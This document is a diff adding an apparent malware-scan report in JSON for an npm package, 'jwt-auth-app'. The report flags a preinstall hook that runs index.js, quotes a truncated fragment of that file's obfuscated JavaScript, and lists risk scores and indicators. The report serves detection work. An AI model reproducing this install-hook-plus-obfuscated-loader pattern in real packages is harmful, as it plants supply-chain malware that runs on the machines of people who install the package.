@@ -1,0 +1,34 @@
+{
+  "package_metadata": {
+    "name": "jwt-auth-app",
+    "version": "99.10.9"
+  },
+  "behavior_analysis": {
+    "file_operations": [],
+    "network_activity": [],
+    "process_actions": [
+      {
+        "type": "preinstall_script",
+        "details": "The package.json has a script automatically running when the package is installed: 'node index.js'. Location: package/package.json:8."
+      }
+    ]
+  },
+  "malicious_code": {
+    "suspicious_modules": [
+      {
+        "filename": "package/index.js",
+        "code_snippet": "var _0x55c358=_0xa5ec;(function(_0x31b897,_0x691425){var _0x56f000=_0xa5ec,_0x1493ab=_0x31b897();while(!![]){try{var _0xf7ef5d=-parseInt(_0x56f000(0x1dd))/0x1+-parseInt(_0x56f000(0x1f2))/0x2*(-parseInt(_0x56f000(0x1cf))/0x3)+parseInt(_0x56f...1f5)]();}\\n"
+      }
+    ]
+  },
+  "threat_assessment": {
+    "malware_score": 0.75,
+    "risk_score": 0.85,
+    "confidence": 0.92,
+    "indicators": [
+      "Preinstall script execution detected.",
+      "Obfuscated JavaScript code identified with high entropy patterns.",
+      "Potential for executing harmful commands via preinstall hook."
+    ]
+  }
+}
